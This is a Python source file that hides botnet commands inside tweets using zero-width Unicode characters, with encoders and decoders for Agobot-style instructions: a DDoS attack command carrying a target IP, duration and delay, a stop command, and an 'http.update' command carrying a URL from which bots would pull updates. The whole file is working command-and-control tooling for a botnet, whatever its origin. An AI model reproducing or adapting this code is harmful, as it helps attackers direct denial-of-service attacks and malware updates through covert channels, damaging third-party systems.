import re

# use as 1 in our encoding
zw_space = "\u200b"
# use as 0 in our encoding
zw_nonjoiner = "\u200c"
# regex to find sequences of both zero width chars inside of a string
pattern = "[\u200b\u200c]+"

# embeds a botnet instruction, inst, inside a message
def encode(inst, msg=""):
    
    #command family is based on the first word in instruction
    inst = inst.split('.', 1)
    cmd_type = inst[0]
    cmd = inst[1]

    # list of numbers representing command, to be encoded
    numbers = None
    if cmd_type == "ddos":
        numbers = encode_ddos(cmd)
    elif cmd_type == "http":
        numbers = encode_http(cmd)
    else:
        print("Invalid command: {}".format(inst))
    
    # encode list of numbers
    encoded = [encode_number(n) for n in numbers]

    # mix in with msg if msg is long enough
    diff = len(encoded) - len(msg)
    if diff > 0:
        print("Your message must be {} chars longer to embed this instruction.".format(diff))
        return None

    sums_list = [i for j in zip(msg,encoded) for i in j]
    remaining_chars = len(msg) - len(sums_list) // 2
    start = len(msg) - remaining_chars
    encoded_msg = ''.join(sums_list) + msg[start:]

    # complain if tweet is too long for twitter char limits
    if len(encoded_msg) > 280:
        print("Your message is too long to fit in a single tweet.")
        return None
    
    return encoded_msg

# extracts a hidden message from a string
def decode(msg):
    # look for all of our zero width chars in the message
    extracted = re.findall(pattern, msg)

    # turn them back to ints
    decoded = [decode_number(n) for n in extracted]

    if decoded[0] < 4:
        return decode_ddos(decoded)
    elif decoded[0] < 8:
        return decode_http(decoded)

# encodes a select subset of the ddos commands from Agobot
def encode_ddos(cmd):
    cmd = cmd.split()

    if cmd[0] == "stop":
        opcode = 0
        return [opcode]
    elif cmd[0] == "phatwonk":
        if len(cmd) < 4:
            print("Missing parameters for phatwonk")
            return None

        opcode = 1

        try:
            ip_list = [int(num) for num in cmd[1].split(".")]
        except ValueError:
            print("Invalid host ip address")
            return None
        
        try:
            time = int(cmd[2])
        except ValueError:
            print("Invalid attack duration")
            return None

        try:
            delay = int(cmd[3])
        except ValueError:
            print("Invalid attack delay")
            return None

        return [opcode] + ip_list + [time, delay]

def encode_http(cmd):
    cmd = cmd.split()

    if cmd[0] == "update":
        if len(cmd) < 2:
            print("Missing parameters for http update")
            return None

        opcode = 4

        url = []
        for c in cmd[1]:
            url.append(ord(c))

        return [opcode] + url

# encodes a single number in binary using zero width chars
def encode_number(n):
    # Turn int to binary string
    s = format(n, 'b')

    # Replace the 1's and 0's with the zero width chars
    s = s.replace("1", zw_space)
    s = s.replace("0", zw_nonjoiner)

    return s

# decodes a select subset of the ddos commands from Agobot
def decode_ddos(l):
    if l[0] == 0:
        return "ddos.stop"
    elif l[0] == 1:
        ip_addr = ".".join([str(c) for c in l[1:5]])
        time = l[5]
        delay = l[6]
        return "ddos.phatwonk {} {} {}".format(ip_addr, time, delay)

# decodes the http.update command from Agobot
def decode_http(l):
    # if opcode is for http.update
    if l[0] == 4: 
        url = "".join([chr(c) for c in l[1:]])
        return "http.update {}".format(url)

# decodes a string of zero width chars into a number
def decode_number(s):
    s = s.replace(zw_space, "1")
    s = s.replace(zw_nonjoiner, "0")
    return int(s,2)
